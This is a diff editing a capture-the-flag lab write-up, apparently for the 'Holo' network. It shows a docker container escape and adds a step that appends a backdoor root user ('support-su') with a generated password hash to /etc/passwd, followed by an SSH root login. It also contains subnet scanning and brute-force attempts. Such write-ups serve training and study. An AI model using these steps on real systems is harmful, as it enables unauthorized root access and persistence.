@@ -1078,8 +1078,8 @@ Again I performed the usual step to privilege escalation. This time looking for 
     /usr/bin/docker
     ...
 
-Actually I didn't know how to abuse docker binary to escalate my privilege. Searching around I found this [resource](https://gtfobins.github.io/gtfobins/docker). We can try a so-called docker escape tecnique to elevate to root.
-I took me a while to realize what is this alpine value used in the sample command, that is the name of a running docker image:tag
+Actually I didn't know how to abuse docker binary to escalate my privilege. Searching around I found this [resource](https://gtfobins.github.io/gtfobins/docker). We can try a container escape tecnique to elevate to root.
+It took me a while to realize what is this alpine value used in the sample command, that is the name of a running docker image:tag
 We can search for running docker images as follows:
 
     docker images -a
@@ -1141,10 +1141,26 @@ Again we can take advantage of the docker suid vulnearbility to add another user
 
     root@0acf73a8ca6d:/# 
 
-[TODO:explain]
+Now we can proceed to add a new entry to the /etc/passwd file with root privilege, but first we need to generate a compliance [password hash](https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow):
 
+    openssl passwd -6 -salt xyz Pwd1234
+    $6$xyz$QPpRe.vKRkmPLc0hZLHMNMuoYIM96CzLbWVluRaUH3NPycNnP6Z4WiGcI6v/kM7yDZu7rJALqIc8Pvgu64Akt
 
-    
+Then we can insert at the end of the /etc/passwd file the following line:
+
+    vi /etc/passwd
+    ....
+    support-su:$6$xyz$QPpRe.vKRkmPLc0hZLHMNMuoYIM96CzLbWVluRaUH3NPycNnP6Z4WiGcI6v/kM7yDZu7rJALqIc8Pvgu64Akt.:0:0:root:/root:/bin/bash
+
+Actually we are inserting an alias for the root user called support-su. Now we can even login with ssh using the new added user:
+
+    ssh support-su@10.200.95.33
+    ...
+    Last login: Mon Jun 17 22:32:35 2024 from 10.50.74.35
+            .-/+oossssoo+/-.               support-su@ip-10-200-95-33 
+        `:+ssssssssssssssssss+:`           -------------------------- 
+    ...
+    root@ip-10-200-95-33:~# 
 
 From this host we can perform a further host discovery on the 10.200.95.0/24 subnet. Luckily nmap is already installed on the server:
 
@@ -1368,7 +1384,7 @@ So we have 5 hosts, excluding the IP .33 (current machine), .1 is the GW, we can
     Nmap done: 5 IP addresses (5 hosts up) scanned in 224.81 seconds
 
 
-From the above results we can infer that
+From the above results we can infer that:
 - .30 host is the DC:  DC-SRV01.holo.live
 - .31:  S-SRV01.holo.live
 - .32: S-SRV02.holo.live
@@ -1448,8 +1464,7 @@ So having a valid user and the corresponding token (sent by email) could permits
     Finished
     ===============================================================
 
-So there is a reset and even an upload file, but without authentication we are redirected to the index page. So it seems that we have to find a valid user at first. I tried to brute force it with hydra using commons usenames wordlist but without any luck.
-Then I tried with the other credentials found before, dumping users table:
+So there is a reset and even an upload file, but without authentication we are redirected to the index page. So it seems that we have to find a valid user at first. I tried to brute force it with hydra using commons usenames wordlist but without any luck. Then I tried with the other credentials found before, dumping users table:
 
     http://10.200.95.31/login.php?user=gurag&password=AAAA
 
